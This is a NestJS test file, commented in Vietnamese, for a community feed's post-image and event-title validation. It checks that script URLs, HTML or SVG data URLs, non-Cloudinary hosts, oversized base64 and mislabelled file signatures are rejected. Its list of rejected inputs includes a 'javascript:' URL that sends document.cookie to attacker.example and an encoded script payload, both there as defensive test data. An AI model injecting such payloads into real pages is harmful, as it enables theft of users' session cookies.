import 'reflect-metadata';
import { ValidationPipe } from '@nestjs/common';
import { BadRequestException } from '@nestjs/common';
import { CreateEventDto, CreatePostDto, EditPostDto } from './community-feed.controller';

/** Đúng cấu hình ValidationPipe toàn cục ở main.ts. */
const pipe = new ValidationPipe({ whitelist: true, forbidNonWhitelisted: true, transform: true });
const asCreate = (value: Record<string, unknown>) =>
  pipe.transform(value, { type: 'body', metatype: CreatePostDto, data: undefined });
const asEdit = (value: Record<string, unknown>) =>
  pipe.transform(value, { type: 'body', metatype: EditPostDto, data: undefined });

const JPEG_DATA_URL = `data:image/jpeg;base64,/9j/${'A'.repeat(300_000)}==`;

// ENGAGE-7: images chỉ @IsString nên một bài nhận được bất kỳ chuỗi nào (tới 10MB/body): feed nặng hàng MB, và
// chuỗi "javascript:" cũng được lưu để hiển thị lại cho người khác.
describe('CreatePostDto/EditPostDto.images (ENGAGE-7)', () => {
  it('nhận ảnh base64 nén và URL Cloudinary, tối đa 6 ảnh', async () => {
    const images = [JPEG_DATA_URL, 'https://res.cloudinary.com/demo/image/upload/v1/feed/a.jpg'];
    await expect(asCreate({ body: 'Chia sẻ', images })).resolves.toBeDefined();
    await expect(asEdit({ images })).resolves.toBeDefined();
    await expect(asCreate({ body: 'Chia sẻ', images: Array(6).fill(JPEG_DATA_URL) })).resolves.toBeDefined();
  });

  it.each([
    ["javascript:fetch('https://attacker.example/x?'+document.cookie)"],
    ['data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
    ['data:image/svg+xml;base64,PHN2Zz48L3N2Zz4='],
    ['data:image/gif;base64,R0lGODlhAQABAAAAACw='],
    ['http://res.cloudinary.com/demo/image/upload/a.jpg'],
    ['https://attacker.example/a.jpg'],
    ['không phải ảnh'],
  ])('từ chối ảnh không an toàn %s (tạo và sửa bài)', async (img) => {
    await expect(asCreate({ body: 'Chia sẻ', images: [img] })).rejects.toThrow();
    await expect(asEdit({ images: [img] })).rejects.toThrow();
  });

  it('từ chối ảnh base64 hơn 700.000 ký tự (chống một bài làm nặng cả feed) và quá 6 ảnh', async () => {
    const huge = `data:image/jpeg;base64,${'A'.repeat(750_000)}`;
    await expect(asCreate({ body: 'Chia sẻ', images: [huge] })).rejects.toThrow();
    await expect(asEdit({ images: [huge] })).rejects.toThrow();
    await expect(asCreate({ body: 'Chia sẻ', images: Array(7).fill(JPEG_DATA_URL) })).rejects.toThrow();
  });
});

// BAOMAT-02: chuỗi base64 rác (không phải tệp ảnh) không được lưu vào bài.
describe('CreatePostDto/EditPostDto.images chữ ký tệp (BAOMAT-02)', () => {
  const PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==';
  const WEBP = 'data:image/webp;base64,UklGRiQAAABXRUJQVlA4IBgAAAAw';
  it('nhận ảnh có chữ ký PNG, JPEG, WebP đúng loại khai', async () => {
    await expect(asCreate({ body: 'Chia sẻ', images: [PNG, WEBP, JPEG_DATA_URL] })).resolves.toBeDefined();
    await expect(asEdit({ images: [PNG] })).resolves.toBeDefined();
  });
  it.each([
    ['toàn chữ A (mẫu feed1.mjs)', `data:image/png;base64,${'A'.repeat(600_000)}`],
    ['JPEG khai là PNG', 'data:image/png;base64,/9j/4AAQSkZJRgABAQ=='],
    ['PNG khai là JPEG', 'data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUg=='],
    ['WebP thiếu nhãn WEBP', 'data:image/webp;base64,UklGRiQAAABBQUFBVlA4IBgAAAAw'],
    ['chữ thường base64', `data:image/jpeg;base64,${Buffer.from('hello world, not an image').toString('base64')}`],
  ])('từ chối %s (tạo và sửa bài)', async (_label, img) => {
    await expect(asCreate({ body: 'Chia sẻ', images: [img] })).rejects.toThrow();
    await expect(asEdit({ images: [img] })).rejects.toThrow();
  });
});

describe('CreateEventDto.title: cắt khoảng trắng và không rỗng', () => {
  const asEvent = (value: Record<string, unknown>) =>
    pipe.transform(value, { type: 'body', metatype: CreateEventDto, data: undefined }) as Promise<{ title: string }>;
  const dates = { startAt: '2026-08-01T00:00:00Z', endAt: '2026-08-10T00:00:00Z' };

  it.each(['', '   ', '\t\n'])('tiêu đề %j bị từ chối 400', async (title) => {
    await expect(asEvent({ title, ...dates })).rejects.toBeInstanceOf(BadRequestException);
  });

  it('" Hội chợ " lưu thành "Hội chợ"', async () => {
    await expect(asEvent({ title: ' Hội chợ ', ...dates })).resolves.toMatchObject({ title: 'Hội chợ' });
  });
});
